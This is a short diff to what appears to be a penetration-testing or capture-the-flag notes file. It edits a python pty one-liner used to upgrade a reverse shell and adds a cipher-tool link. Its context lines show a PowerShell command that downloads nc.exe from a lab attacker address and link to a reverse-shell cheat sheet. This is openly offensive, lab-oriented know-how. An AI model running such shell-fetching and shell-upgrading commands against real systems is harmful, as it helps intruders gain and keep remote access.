@@ -31,7 +31,7 @@ powershell Invoke-Webrequest -OutFile C:\temp\nc.exe -Uri http://10.10.14.116/nc
 Using Python for a psuedo terminal
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # In reverse shell
 $ python -c 'import pty; pty.spawn("/bin/bash")'
@@ -119,3 +119,6 @@ ctrl+shift+prtscr for screenshot selection
 
 # Resources
 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+# Cryptography
+http://rumkin.com/tools/cipher/
